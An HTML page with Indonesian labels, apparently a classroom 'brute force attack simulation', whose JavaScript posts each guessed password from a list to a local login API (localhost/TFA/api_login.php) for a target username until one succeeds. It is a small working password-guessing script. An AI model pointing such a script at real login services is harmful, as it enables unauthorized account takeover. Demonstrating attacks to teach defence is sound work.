<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Simulasi Brute Force Attack</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
<style>
  body {
    background: #f0f0f5;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
  }
  .card {
    max-width: 480px;
    width: 100%;
    padding: 2rem;
    border-radius: 12px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
    background: white;
  }
  .result {
    margin-top: 1rem;
    max-height: 240px;
    overflow-y: auto;
    font-family: monospace;
    white-space: pre-wrap;
    background: #fafafa;
    border: 1px solid #ddd;
    border-radius: 6px;
    padding: 1rem;
  }
</style>
</head>
<body>

<div class="card">
  <h3 class="text-center mb-4">Simulasi Brute Force Attack</h3>
  <form method="POST" id="bfForm">
    <div class="mb-3">
      <label for="username" class="form-label">Target Username</label>
      <input type="text" class="form-control" id="username" name="username" placeholder="Masukkan username target" required value="atik" />
    </div>
    <div class="mb-3">
      <label for="wordlist" class="form-label">List Password Tebakan<br><small class="text-muted">(pisahkan dengan koma)</small></label>
      <textarea class="form-control" id="wordlist" name="wordlist" rows="3" placeholder="Contoh: 123,password,tika123" required>123,password,tika123,1234</textarea>
    </div>
    <button type="submit" class="btn btn-danger w-100">Mulai Serangan</button>
  </form>

  <div class="result mt-4" id="result" style="display:none;"></div>
</div>

<script>
  const form = document.getElementById('bfForm');
  const resultDiv = document.getElementById('result');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    resultDiv.style.display = 'block';
    resultDiv.innerHTML = 'Memulai serangan...\n';

    const username = form.username.value.trim();
    const passwords = form.wordlist.value.split(',').map(p => p.trim());

    for (const pwd of passwords) {
      resultDiv.innerHTML += `Mencoba: ${pwd}\n`;

      try {
        const response = await fetch('http://localhost/TFA/api_login.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({ username, password: pwd }),
        });
        const data = await response.json();

        if (data.status === 'success') {
          resultDiv.innerHTML += `Password DITEMUKAN: ${pwd}\n`;
          break;
        } else {
          resultDiv.innerHTML += `${data.message}\n`;
        }
      } catch (err) {
        resultDiv.innerHTML += `Error: Tidak dapat terhubung ke server\n`;
        break;
      }
    }

    if (!resultDiv.innerHTML.includes('Password DITEMUKAN')) {
      resultDiv.innerHTML += '\nSemua tebakan gagal. Password tidak ditemukan.\n';
    }
  });
</script>

</body>
</html>
